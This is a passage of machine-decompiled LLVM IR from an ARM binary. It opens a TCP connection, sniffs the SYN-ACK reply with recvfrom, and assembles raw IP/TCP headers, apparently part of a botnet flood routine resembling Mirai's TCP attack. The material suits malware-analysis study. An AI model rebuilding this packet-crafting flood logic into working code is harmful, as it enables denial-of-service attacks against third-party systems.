  %v4_ac88 = zext i8 %tmp40 to i32
  %v4_ac8c = zext i8 %tmp39 to i32
  %v4_ac98 = mul nuw nsw i32 %v4_ac8c, 256
  %v4_aca8 = zext i8 %tmp to i32
  %v1_acac = and i32 %v4_aca8, 18
  %v2_acb0 = icmp eq i32 %v1_acac, 18
  %v1_abc8 = mul nuw nsw i32 %v3_aa58, 256
  %v4_abcc = and i32 %v1_abc8, 65280
  %v5_abcc = or i32 %v8_aaa4, %v4_abcc
  %v3_abd0112 = udiv i32 %v4_abcc, 256
  %v1_abd4 = trunc i32 %v3_abd0112 to i8
  %v5_ac98 = or i32 %v4_ac88, %v4_ac98
  %v1_acb8 = and i32 %v4_aca8, 5
  %v2_acb8 = icmp eq i32 %v1_acb8, 0
  %v1_abd8 = trunc i32 %v8_aaa4 to i8
  %v1_ade4 = trunc i32 %v5_a8f0 to i8
  %v1_aeb0 = urem i32 %v6_a964, 2
  %tmp113 = sub nsw i32 0, %v1_aeb0
  %v4_aeb8 = and i32 %tmp113, 32
  %v1_aec8 = urem i32 %v6_a984, 2
  %tmp114 = sub nsw i32 0, %v1_aec8
  %v4_aed0 = and i32 %tmp114, 16
  %v1_aee0 = urem i32 %v6_a9a4, 2
  %tmp115 = sub nsw i32 0, %v1_aee0
  %v4_aee8 = and i32 %tmp115, 8
  %v1_aef8 = urem i32 %v6_a9c4, 2
  %tmp116 = sub nsw i32 0, %v1_aef8
  %v4_af00 = and i32 %tmp116, 4
  %v1_af10 = urem i32 %v6_a9e4, 2
  %tmp117 = sub nsw i32 0, %v1_af10
  %v3_af18 = and i32 %tmp117, 2
  br label %dec_label_pc_aac0

dec_label_pc_aac0:                                ; preds = %dec_label_pc_af4c, %dec_label_pc_acc0, %dec_label_pc_aac0.preheader
  store i32 %v8_aaa8, i32* %r3.global-to-local, align 4
  store i32 %v1_aacc, i32* %ip.global-to-local, align 4
  %v0_aad8 = load i32, i32* @sb, align 4
  %v1_aad8 = add i32 %v0_aad8, 40
  store i32 %v1_aad8, i32* @sl, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_aae8106 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_aae8106, i32* %r0.global-to-local, align 4
  %v2_aaec107 = icmp eq i32 %v3_aae8106, -1
  store i1 %v2_aaec107, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_aae8106, i32* @r7, align 4
  br i1 %v2_aaec107, label %dec_label_pc_af4c, label %dec_label_pc_aaf8

dec_label_pc_aaf8:                                ; preds = %dec_label_pc_aac0, %dec_label_pc_accc
  %v3_aae8108 = phi i32 [ %v3_aae8, %dec_label_pc_accc ], [ %v3_aae8106, %dec_label_pc_aac0 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ab00 = call i32 (i32, i32, ...) @fcntl(i32 %v3_aae8108, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_ab08 = or i32 %v2_ab00, 2048
  store i32 %v1_ab08, i32* %r2.global-to-local, align 4
  %v0_ab0c = load i32, i32* @r7, align 4
  store i32 %v0_ab0c, i32* %r0.global-to-local, align 4
  %v2_ab10 = call i32 (i32, i32, ...) @fcntl(i32 %v0_ab0c, i32 4)
  %v3_ab14 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ab14, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v5_ab30 = mul i32 %v3_ab14, 24
  store i32 %v5_ab30, i32* %r1.global-to-local, align 4
  %v2_ab34 = add i32 %v5_ab30, %arg2
  store i32 %v2_ab34, i32* %r2.global-to-local, align 4
  %v1_ab38 = add i32 %v2_ab34, 20
  %v2_ab38 = inttoptr i32 %v1_ab38 to i8*
  %v3_ab38 = load i8, i8* %v2_ab38, align 1
  %v4_ab38 = zext i8 %v3_ab38 to i32
  store i32 %v4_ab38, i32* %r3.global-to-local, align 4
  %v2_ab3c = icmp ugt i8 %v3_ab38, 30
  %v7_ab3c = icmp eq i8 %v3_ab38, 31
  store i1 %v7_ab3c, i1* %cpsr_z.global-to-local, align 1
  %v2_ab40 = xor i1 %v7_ab3c, true
  %v3_ab40 = and i1 %v2_ab3c, %v2_ab40
  %v5_ab40 = add i32 %v2_ab34, 16
  %v6_ab40 = inttoptr i32 %v5_ab40 to i32*
  %v7_ab40 = load i32, i32* %v6_ab40, align 4
  br i1 %v3_ab40, label %dec_label_pc_abac, label %dec_label_pc_ab4c

dec_label_pc_ab4c:                                ; preds = %dec_label_pc_aaf8
  store i32 %v7_ab40, i32* %r4.global-to-local, align 4
  %v0_ab50 = call i32 @function_f6c4()
  store i32 %v0_ab50, i32* %r0.global-to-local, align 4
  %v3_ab54 = load i32, i32* %stack_var_-40, align 4
  %v5_ab5c = mul i32 %v3_ab54, 24
  %v2_ab68 = add i32 %v5_ab5c, %arg2
  store i32 %v2_ab68, i32* %r1.global-to-local, align 4
  %v1_ab64 = udiv i32 %v7_ab40, 256
  %v3_ab6c = and i32 %v1_ab64, 65280
  store i32 %v3_ab6c, i32* %r2.global-to-local, align 4
  %v1_ab70 = and i32 %v7_ab40, 65280
  store i32 %v1_ab70, i32* %r3.global-to-local, align 4
  %v3_ab74 = mul i32 %v7_ab40, 16777216
  store i32 %v3_ab74, i32* %ip.global-to-local, align 4
  %v1_ab78 = add i32 %v2_ab68, 20
  %v2_ab78 = inttoptr i32 %v1_ab78 to i8*
  %v3_ab78 = load i8, i8* %v2_ab78, align 1
  %v4_ab78 = zext i8 %v3_ab78 to i32
  store i32 %v4_ab78, i32* %lr.global-to-local, align 4
  %v4_ab7c = mul nuw nsw i32 %v1_ab70, 256
  %v5_ab7c = or i32 %v4_ab7c, %v3_ab74
  store i32 %v5_ab7c, i32* %ip.global-to-local, align 4
  %v2_ab84 = call i32 @llvm.bswap.i32(i32 %v7_ab40)
  %v7_ab88 = lshr i32 %v0_ab50, %v4_ab78
  %v8_ab88 = add i32 %v7_ab88, %v2_ab84
  store i32 %v8_ab88, i32* %r2.global-to-local, align 4
  %v3_ab94 = mul i32 %v8_ab88, 16777216
  %v1_ab98 = and i32 %v8_ab88, 65280
  store i32 %v1_ab98, i32* %r0.global-to-local, align 4
  %v4_ab9c = mul nuw nsw i32 %v1_ab98, 256
  %v5_ab9c = or i32 %v4_ab9c, %v3_ab94
  store i32 %v5_ab9c, i32* %r1.global-to-local, align 4
  %v2_aba4 = call i32 @llvm.bswap.i32(i32 %v8_ab88)
  br label %dec_label_pc_abac

dec_label_pc_abac:                                ; preds = %dec_label_pc_aaf8, %dec_label_pc_ab4c
  %storemerge34 = phi i32 [ %v2_aba4, %dec_label_pc_ab4c ], [ %v7_ab40, %dec_label_pc_aaf8 ]
  store i32 %v3_aa58, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_abb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_abb8, label %dec_label_pc_ace8, label %dec_label_pc_abc0

dec_label_pc_abc0:                                ; preds = %dec_label_pc_abac
  store i32 %v3_aa58, i32* %r0.global-to-local, align 4
  store i32 %v8_aaa4, i32* %r1.global-to-local, align 4
  store i32 %v5_abcc, i32* %r3.global-to-local, align 4
  store i32 %v3_abd0112, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_abdc

dec_label_pc_abdc:                                ; preds = %dec_label_pc_ace8, %dec_label_pc_abc0
  %stack_var_-57.0 = phi i8 [ %v1_acf0, %dec_label_pc_ace8 ], [ %v1_abd4, %dec_label_pc_abc0 ]
  %storemerge = phi i8 [ %v1_ace8, %dec_label_pc_ace8 ], [ %v1_abd8, %dec_label_pc_abc0 ]
  store i32 %v2_abdc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_abe4 = load i32, i32* @r7, align 4
  store i32 %v0_abe4, i32* %r0.global-to-local, align 4
  %v5_abe8 = call i32 @connect(i32 %v0_abe4, %sockaddr* nonnull %tmp86, i32 16)
  store i32 %v1_aacc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v5_abf8, i32* %r2.global-to-local, align 4
  %v2_ac00 = call i32 @time(i32* null)
  store i32 %v2_ac00, i32* %r0.global-to-local, align 4
  store i32 %v2_ac00, i32* %r4.global-to-local, align 4
  store i32 %v3_ac0c, i32* %ip.global-to-local, align 4
  %v9_ac6c = icmp eq i32 %tmp41, %storemerge34
  %v4_ac90 = zext i8 %storemerge to i32
  %v4_ac94 = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_ac6c to i32
  %v9_ac80 = icmp eq i1 %v9_ac6c, false
  %v4_ac9c = mul nuw nsw i32 %v4_ac94, 256
  %v5_ac9c = or i32 %v4_ac9c, %v4_ac90
  %v9_aca0 = icmp eq i32 %v5_ac9c, %v5_ac98
  br label %dec_label_pc_ac28

dec_label_pc_ac18:                                ; preds = %.thread32, %dec_label_pc_ac88, %dec_label_pc_acb8, %bb89
  %v2_ac18 = call i32 @time(i32* null)
  %v0_ac1c = load i32, i32* %r4.global-to-local, align 4
  %v2_ac1c = sub i32 %v2_ac18, %v0_ac1c
  store i32 %v2_ac1c, i32* %r0.global-to-local, align 4
  %v7_ac20 = icmp eq i32 %v2_ac1c, 10
  store i1 %v7_ac20, i1* %cpsr_z.global-to-local, align 1
  %v8_ac24 = icmp sgt i32 %v2_ac1c, 10
  br i1 %v8_ac24, label %dec_label_pc_accc, label %dec_label_pc_ac28

dec_label_pc_ac28:                                ; preds = %dec_label_pc_ac18, %dec_label_pc_abdc
  store i32 16, i32* %stack_var_-44, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_ac3c, i32* %r1.global-to-local, align 4
  store i32 %v2_ac40, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_aa54, i32* %r0.global-to-local, align 4
  %v10_ac50 = call i32 @recvfrom(i32 %v3_aa54, i32* nonnull %stack_var_-332, i32 256, i32 16384, %sockaddr* %tmp87, i32* nonnull %stack_var_-44)
  store i32 %v10_ac50, i32* %r2.global-to-local, align 4
  %v2_ac58 = icmp eq i32 %v10_ac50, -1
  store i1 %v2_ac58, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_ac58, label %dec_label_pc_ace0, label %dec_label_pc_ac64

dec_label_pc_ac64:                                ; preds = %dec_label_pc_ac28
  store i32 %storemerge34, i32* %lr.global-to-local, align 4
  store i32 %tmp41, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_ac78 = icmp eq i32 %v10_ac50, 40
  store i1 %v7_ac78, i1* %cpsr_z.global-to-local, align 1
  %tmp118 = icmp ult i32 %v10_ac50, 41
  br i1 %tmp118, label %.thread32, label %bb89

.thread32:                                        ; preds = %dec_label_pc_ac64
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ac18

bb89:                                             ; preds = %dec_label_pc_ac64
  store i1 %v9_ac80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac80, label %dec_label_pc_ac18, label %dec_label_pc_ac88

dec_label_pc_ac88:                                ; preds = %bb89
  store i32 %v4_ac8c, i32* %r1.global-to-local, align 4
  store i32 %v4_ac90, i32* %ip.global-to-local, align 4
  store i32 %v4_ac94, i32* %r2.global-to-local, align 4
  store i32 %v5_ac98, i32* %r3.global-to-local, align 4
  store i32 %v5_ac9c, i32* @r5, align 4
  store i1 %v9_aca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aca0, label %dec_label_pc_aca8, label %dec_label_pc_ac18

dec_label_pc_aca8:                                ; preds = %dec_label_pc_ac88
  store i32 %v4_aca8, i32* %r2.global-to-local, align 4
  store i32 %v1_acac, i32* %r3.global-to-local, align 4
  store i1 %v2_acb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_acb0, label %dec_label_pc_acfc, label %dec_label_pc_acb8

dec_label_pc_acb8:                                ; preds = %dec_label_pc_aca8
  store i1 %v2_acb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_acb8, label %dec_label_pc_ac18, label %dec_label_pc_acc0

dec_label_pc_acc0:                                ; preds = %dec_label_pc_acb8
  %v0_acc0 = load i32, i32* @r7, align 4
  store i32 %v0_acc0, i32* %r0.global-to-local, align 4
  %v1_acc4 = call i32 @close(i32 %v0_acc0)
  store i32 %v1_acc4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aac0

dec_label_pc_accc:                                ; preds = %dec_label_pc_ac18
  %v0_accc = load i32, i32* @r7, align 4
  store i32 %v0_accc, i32* %r0.global-to-local, align 4
  %v1_acd0 = call i32 @close(i32 %v0_accc)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_aae8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_aae8, i32* %r0.global-to-local, align 4
  %v2_aaec = icmp eq i32 %v3_aae8, -1
  store i1 %v2_aaec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_aae8, i32* @r7, align 4
  br i1 %v2_aaec, label %dec_label_pc_af4c, label %dec_label_pc_aaf8

dec_label_pc_acd8:                                ; preds = %dec_label_pc_aa6c
  store i32 %v3_aa54, i32* %r0.global-to-local, align 4
  %v1_acdc = call i32 @close(i32 %v3_aa54)
  store i32 %v1_acdc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ace0

dec_label_pc_ace0:                                ; preds = %dec_label_pc_ac28, %dec_label_pc_a884, %dec_label_pc_acd8
  %v29_ace4 = phi i32 [ -1, %dec_label_pc_a884 ], [ %v1_acdc, %dec_label_pc_acd8 ], [ 0, %dec_label_pc_ac28 ]
  store i32 %v3_a884, i32* %r4.global-to-local, align 4
  ret i32 %v29_ace4

dec_label_pc_ace8:                                ; preds = %dec_label_pc_abac
  %v0_ace8 = call i32 @function_f6c4()
  %v1_ace8 = trunc i32 %v0_ace8 to i8
  store i32 %v0_ace8, i32* %r0.global-to-local, align 4
  %v4_acec = sdiv i32 %v0_ace8, 256
  store i32 %v4_acec, i32* %r3.global-to-local, align 4
  %v1_acf0 = trunc i32 %v4_acec to i8
  br label %dec_label_pc_abdc

dec_label_pc_acfc:                                ; preds = %dec_label_pc_aca8
  %v3_acfc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_acfc, i32* %r4.global-to-local, align 4
  store i32 %v4_a8a4, i32* %r2.global-to-local, align 4
  %v3_ad04 = mul i32 %v3_acfc, 16
  store i32 %v3_ad04, i32* %ip.global-to-local, align 4
  %v3_ad08 = add i32 %v3_ad04, %v4_a8a4
  %v4_ad08 = inttoptr i32 %v3_ad08 to i32*
  store i32 %storemerge34, i32* %v4_ad08, align 4
  %v0_ad0c = load i32, i32* @r6, align 4
  %v1_ad0c = add i32 %v0_ad0c, 4
  %v2_ad0c = inttoptr i32 %v1_ad0c to i32*
  %v3_ad0c = load i32, i32* %v2_ad0c, align 4
  %v1_ad18 = and i32 %v3_ad0c, 65280
  store i32 %v1_ad18, i32* %r1.global-to-local, align 4
  %v3_ad1c = mul i32 %v3_ad0c, 16777216
  store i32 %v4_a8a4, i32* %r0.global-to-local, align 4
  %v4_ad28 = mul nuw nsw i32 %v1_ad18, 256
  %v5_ad28 = or i32 %v4_ad28, %v3_ad1c
  store i32 %v5_ad28, i32* %r2.global-to-local, align 4
  %v1_ad2c = load i32, i32* %ip.global-to-local, align 4
  %v2_ad2c = add i32 %v1_ad2c, %v4_a8a4
  store i32 %v2_ad2c, i32* %ip.global-to-local, align 4
  %v2_ad30 = call i32 @llvm.bswap.i32(i32 %v3_ad0c)
  store i32 %v2_ad30, i32* %r3.global-to-local, align 4
  %v2_ad34 = add i32 %v2_ad2c, 4
  %v3_ad34 = inttoptr i32 %v2_ad34 to i32*
  store i32 %v2_ad30, i32* %v3_ad34, align 4
  %v0_ad38 = load i32, i32* @r6, align 4
  %v1_ad38 = add i32 %v0_ad38, 8
  %v2_ad38 = inttoptr i32 %v1_ad38 to i32*
  %v3_ad38 = load i32, i32* %v2_ad38, align 4
  store i32 %v3_ad38, i32* %r0.global-to-local, align 4
  %v1_ad40 = and i32 %v3_ad38, 65280
  store i32 %v1_ad40, i32* %r1.global-to-local, align 4
  %v3_ad44 = mul i32 %v3_ad38, 16777216
  %v4_ad4c = mul nuw nsw i32 %v1_ad40, 256
  %v5_ad4c = or i32 %v4_ad4c, %v3_ad44
  store i32 %v5_ad4c, i32* %r2.global-to-local, align 4
  %v2_ad54 = call i32 @llvm.bswap.i32(i32 %v3_ad38)
  store i32 %v2_ad54, i32* %r3.global-to-local, align 4
  %v1_ad58 = load i32, i32* %ip.global-to-local, align 4
  %v2_ad58 = add i32 %v1_ad58, 8
  %v3_ad58 = inttoptr i32 %v2_ad58 to i32*
  store i32 %v2_ad54, i32* %v3_ad58, align 4
  %v0_ad5c = load i32, i32* @r6, align 4
  %v1_ad5c = inttoptr i32 %v0_ad5c to i32*
  %v2_ad5c = load i32, i32* %v1_ad5c, align 4
  %v3_ad60 = udiv i32 %v2_ad5c, 65536
  store i32 %v3_ad60, i32* %r2.global-to-local, align 4
  %v3_ad646 = udiv i32 %v2_ad5c, 16777216
  store i32 %v3_ad646, i32* %r1.global-to-local, align 4
  %v0_ad68 = load i32, i32* @r5, align 4
  %v3_ad68 = sdiv i32 %v0_ad68, 256
  store i32 %v3_ad68, i32* %r3.global-to-local, align 4
  %v1_ad6c = trunc i32 %v3_ad68 to i8
  %v2_ad6c = load i32, i32* %ip.global-to-local, align 4
  %v3_ad6c = add i32 %v2_ad6c, 15
  %v4_ad6c = inttoptr i32 %v3_ad6c to i8*
  store i8 %v1_ad6c, i8* %v4_ad6c, align 1
  %v0_ad70 = load i32, i32* %r1.global-to-local, align 4
  %v1_ad70 = trunc i32 %v0_ad70 to i8
  %v2_ad70 = load i32, i32* %ip.global-to-local, align 4
  %v3_ad70 = add i32 %v2_ad70, 13
  %v4_ad70 = inttoptr i32 %v3_ad70 to i8*
  store i8 %v1_ad70, i8* %v4_ad70, align 1
  %v0_ad74 = load i32, i32* %r2.global-to-local, align 4
  %v1_ad74 = trunc i32 %v0_ad74 to i8
  %v2_ad74 = load i32, i32* %ip.global-to-local, align 4
  %v3_ad74 = add i32 %v2_ad74, 12
  %v4_ad74 = inttoptr i32 %v3_ad74 to i8*
  store i8 %v1_ad74, i8* %v4_ad74, align 1
  %v0_ad78 = load i32, i32* @r5, align 4
  %v1_ad78 = trunc i32 %v0_ad78 to i8
  %v2_ad78 = load i32, i32* %ip.global-to-local, align 4
  %v3_ad78 = add i32 %v2_ad78, 14
  %v4_ad78 = inttoptr i32 %v3_ad78 to i8*
  store i8 %v1_ad78, i8* %v4_ad78, align 1
  %v0_ad7c = load i32, i32* @sl, align 4
  store i32 %v0_ad7c, i32* %r0.global-to-local, align 4
  %v1_ad80 = call i32* @malloc(i32 %v0_ad7c)
  %v3_ad80 = ptrtoint i32* %v1_ad80 to i32
  store i32 %v3_ad80, i32* %r0.global-to-local, align 4
  store i32 %v4_a8b4, i32* %r1.global-to-local, align 4
  %v3_ad88 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ad88, i32* %r2.global-to-local, align 4
  %v2_ad8c = load i32, i32* %r4.global-to-local, align 4
  %v5_ad8c = mul i32 %v2_ad8c, 4
  %v6_ad8c = add i32 %v5_ad8c, %v4_a8b4
  %v7_ad8c = inttoptr i32 %v6_ad8c to i32*
  store i32 %v3_ad80, i32* %v7_ad8c, align 4
  %v0_ad90 = load i32, i32* %r1.global-to-local, align 4
  %v1_ad90 = load i32, i32* %r2.global-to-local, align 4
  %v4_ad90 = mul i32 %v1_ad90, 4
  %v5_ad90 = add i32 %v4_ad90, %v0_ad90
  %v6_ad90 = inttoptr i32 %v5_ad90 to i32*
  %v7_ad90 = load i32, i32* %v6_ad90, align 4
  store i32 %v7_ad90, i32* @r4, align 4
  %v1_ad94 = inttoptr i32 %v7_ad90 to i8*
  %v2_ad94 = load i8, i8* %v1_ad94, align 1
  %tmp119 = urem i8 %v2_ad94, 16
  %v1_ad98 = zext i8 %tmp119 to i32
  %v1_ad9c = or i32 %v1_ad98, 64
  store i32 %v1_ad9c, i32* %r3.global-to-local, align 4
  %v1_ada0 = trunc i32 %v1_ad9c to i8
  store i8 %v1_ada0, i8* %v1_ad94, align 1
  %v0_ada4 = load i32, i32* @sl, align 4
  %v3_ada4 = mul i32 %v0_ada4, 65536
  store i32 %v3_ada4, i32* %r2.global-to-local, align 4
  %v0_ada8 = load i32, i32* @r4, align 4
  %v1_ada8 = inttoptr i32 %v0_ada8 to i8*
  %v2_ada8 = load i8, i8* %v1_ada8, align 1
  %v1_adb0 = urem i32 %v0_ada4, 256
  %tmp90 = udiv i32 %v0_ada4, 256
  %v3_adb4 = urem i32 %tmp90, 256
  %v1_adb8 = and i8 %v2_ada8, -16
  %v4_adbc = mul nuw nsw i32 %v1_adb0, 256
  %v5_adbc = or i32 %v4_adbc, %v3_adb4
  store i32 %v5_adbc, i32* %r2.global-to-local, align 4
  %v1_adc0 = or i8 %v1_adb8, 5
  store i32 %v1_a934, i32* %ip.global-to-local, align 4
  store i32 %v1_adb0, i32* %r3.global-to-local, align 4
  store i8 %v1_adc0, i8* %v1_ada8, align 1
  %v0_add0 = load i32, i32* %r3.global-to-local, align 4
  %v1_add0 = trunc i32 %v0_add0 to i8
  %v2_add0 = load i32, i32* @r4, align 4
  %v3_add0 = add i32 %v2_add0, 3
  %v4_add0 = inttoptr i32 %v3_add0 to i8*
  store i8 %v1_add0, i8* %v4_add0, align 1
  store i32 %v5_a8f0, i32* %r3.global-to-local, align 4
  %v0_add8 = load i32, i32* %ip.global-to-local, align 4
  %v2_add8 = icmp eq i32 %v0_add8, 0
  store i1 %v2_add8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_ac04, i32* %r0.global-to-local, align 4
  store i32 %v3_ac0c, i32* %r1.global-to-local, align 4
  %v2_ade4 = load i32, i32* @r4, align 4
  %v3_ade4 = add i32 %v2_ade4, 1
  %v4_ade4 = inttoptr i32 %v3_ade4 to i8*
  store i8 %v1_ade4, i8* %v4_ade4, align 1
  store i32 %v5_a928, i32* %ip.global-to-local, align 4
  %v0_adec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_adec, label %bb92, label %bb91

bb91:                                             ; preds = %dec_label_pc_acfc
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb92

bb92:                                             ; preds = %dec_label_pc_acfc, %bb91
  %v0_adf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_adf0 = trunc i32 %v0_adf0 to i8
  %v2_adf0 = load i32, i32* @r4, align 4
  %v3_adf0 = add i32 %v2_adf0, 2
  %v4_adf0 = inttoptr i32 %v3_adf0 to i8*
  store i8 %v1_adf0, i8* %v4_adf0, align 1
  %v0_adf4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_adf4, label %.thread8, label %bb93

bb93:                                             ; preds = %bb92
  %v1_adf4 = load i32, i32* %r3.global-to-local, align 4
  %v2_adf4 = trunc i32 %v1_adf4 to i8
  %v3_adf4 = load i32, i32* @r4, align 4
  %v4_adf4 = add i32 %v3_adf4, 6
  %v5_adf4 = inttoptr i32 %v4_adf4 to i8*
  store i8 %v2_adf4, i8* %v5_adf4, align 1
  %v0_adf8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_adf8.pr, label %.thread8, label %bb94

bb94:                                             ; preds = %bb93
  store i32 0, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb92, %bb93, %bb94
  store i32 6, i32* %r3.global-to-local, align 4
  %v0_ae00 = load i32, i32* %ip.global-to-local, align 4
  %v1_ae00 = trunc i32 %v0_ae00 to i8
  %v2_ae00 = load i32, i32* @r4, align 4
  %v3_ae00 = add i32 %v2_ae00, 8
  %v4_ae00 = inttoptr i32 %v3_ae00 to i8*
  store i8 %v1_ae00, i8* %v4_ae00, align 1
  %v0_ae04 = load i32, i32* %r3.global-to-local, align 4
  %v1_ae04 = trunc i32 %v0_ae04 to i8
  %v2_ae04 = load i32, i32* @r4, align 4
  %v3_ae04 = add i32 %v2_ae04, 9
  %v4_ae04 = inttoptr i32 %v3_ae04 to i8*
  store i8 %v1_ae04, i8* %v4_ae04, align 1
  %v0_ae08 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ae08, label %bb96, label %bb95

bb95:                                             ; preds = %.thread8
  %v1_ae08 = load i32, i32* %r2.global-to-local, align 4
  %v2_ae08 = trunc i32 %v1_ae08 to i8
  %v3_ae08 = load i32, i32* @r4, align 4
  %v4_ae08 = add i32 %v3_ae08, 7
  %v5_ae08 = inttoptr i32 %v4_ae08 to i8*
  store i8 %v2_ae08, i8* %v5_ae08, align 1
  br label %bb96

bb96:                                             ; preds = %.thread8, %bb95
  %v2_ae10 = load i32, i32* @global_var_1a714.104, align 4
  store i32 %v2_ae10, i32* %r3.global-to-local, align 4
  %v1_ae14 = load i32, i32* @r4, align 4
  %v2_ae14 = add i32 %v1_ae14, 12
  %v3_ae14 = inttoptr i32 %v2_ae14 to i32*
  store i32 %v2_ae10, i32* %v3_ae14, align 4
  %v0_ae18 = load i32, i32* %r0.global-to-local, align 4
  %v1_ae18 = trunc i32 %v0_ae18 to i8
  %v2_ae18 = load i32, i32* @r4, align 4
  %v3_ae18 = add i32 %v2_ae18, 4
  %v4_ae18 = inttoptr i32 %v3_ae18 to i8*
  store i8 %v1_ae18, i8* %v4_ae18, align 1
  %v3_ae1c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ae1c, i32* %r2.global-to-local, align 4
  store i32 %v4_a8a4, i32* %r0.global-to-local, align 4
  %v4_ae24 = mul i32 %v3_ae1c, 16
  %v5_ae24 = add i32 %v4_ae24, %v4_a8a4
  %v6_ae24 = inttoptr i32 %v5_ae24 to i32*
  %v7_ae24 = load i32, i32* %v6_ae24, align 4
  store i32 %v7_ae24, i32* %r3.global-to-local, align 4
  %v0_ae28 = load i32, i32* %r1.global-to-local, align 4
  %v1_ae28 = trunc i32 %v0_ae28 to i8
  %v2_ae28 = load i32, i32* @r4, align 4
  %v3_ae28 = add i32 %v2_ae28, 5
  %v4_ae28 = inttoptr i32 %v3_ae28 to i8*
  store i8 %v1_ae28, i8* %v4_ae28, align 1
  %v0_ae2c = load i32, i32* %r3.global-to-local, align 4
  %v1_ae2c = load i32, i32* @r4, align 4
  %v2_ae2c = add i32 %v1_ae2c, 16
  %v3_ae2c = inttoptr i32 %v2_ae2c to i32*
  store i32 %v0_ae2c, i32* %v3_ae2c, align 4
  %v0_ae30 = load i32, i32* %r2.global-to-local, align 4
  %v3_ae30 = mul i32 %v0_ae30, 16
  %v1_ae34 = load i32, i32* %r0.global-to-local, align 4
  %v2_ae34 = add i32 %v1_ae34, %v3_ae30
  store i32 %v2_ae34, i32* %r2.global-to-local, align 4
  %v1_ae38 = add i32 %v2_ae34, 13
  %v2_ae38 = inttoptr i32 %v1_ae38 to i8*
  %v3_ae38 = load i8, i8* %v2_ae38, align 1
  %v4_ae38 = zext i8 %v3_ae38 to i32
  store i32 %v4_ae38, i32* %r1.global-to-local, align 4
  %v1_ae3c = add i32 %v2_ae34, 12
  %v2_ae3c = inttoptr i32 %v1_ae3c to i8*
  %v3_ae3c = load i8, i8* %v2_ae3c, align 1
  %v4_ae3c = zext i8 %v3_ae3c to i32
  %v4_ae40 = mul nuw nsw i32 %v4_ae38, 256
  %v5_ae40 = or i32 %v4_ae3c, %v4_ae40
  store i32 %v5_ae40, i32* %r3.global-to-local, align 4
  %v2_ae44 = load i32, i32* @r4, align 4
  %v3_ae44 = add i32 %v2_ae44, 20
  %v4_ae44 = inttoptr i32 %v3_ae44 to i8*
  store i8 %v3_ae3c, i8* %v4_ae44, align 1
  %v0_ae48 = load i32, i32* @r4, align 4
  %v1_ae48 = add i32 %v0_ae48, 20
  store i32 %v1_ae48, i32* @r6, align 4
  %v0_ae4c = load i32, i32* %r3.global-to-local, align 4
  %v3_ae4c = sdiv i32 %v0_ae4c, 256
  store i32 %v3_ae4c, i32* %r3.global-to-local, align 4
  %v1_ae50 = trunc i32 %v3_ae4c to i8
  %v3_ae50 = add i32 %v0_ae48, 21
  %v4_ae50 = inttoptr i32 %v3_ae50 to i8*
  store i8 %v1_ae50, i8* %v4_ae50, align 1
  %v0_ae54 = load i32, i32* @r6, align 4
  %v1_ae54 = add i32 %v0_ae54, 13
  %v2_ae54 = inttoptr i32 %v1_ae54 to i8*
  %v3_ae54 = load i8, i8* %v2_ae54, align 1
  %v4_ae54 = zext i8 %v3_ae54 to i32
  store i32 %v4_ae54, i32* %r3.global-to-local, align 4
  %v0_ae58 = load i32, i32* %r2.global-to-local, align 4
  %v1_ae58 = add i32 %v0_ae58, 8
  %v2_ae58 = inttoptr i32 %v1_ae58 to i32*
  %v3_ae58 = load i32, i32* %v2_ae58, align 4
  store i32 %v3_ae58, i32* %r1.global-to-local, align 4
  %v1_ae5c = or i32 %v4_ae54, 1
  store i32 %v1_ae5c, i32* %r3.global-to-local, align 4
  %v1_ae60 = add i32 %v0_ae58, 15
  %v2_ae60 = inttoptr i32 %v1_ae60 to i8*
  %v3_ae60 = load i8, i8* %v2_ae60, align 1
  %v4_ae60 = zext i8 %v3_ae60 to i32
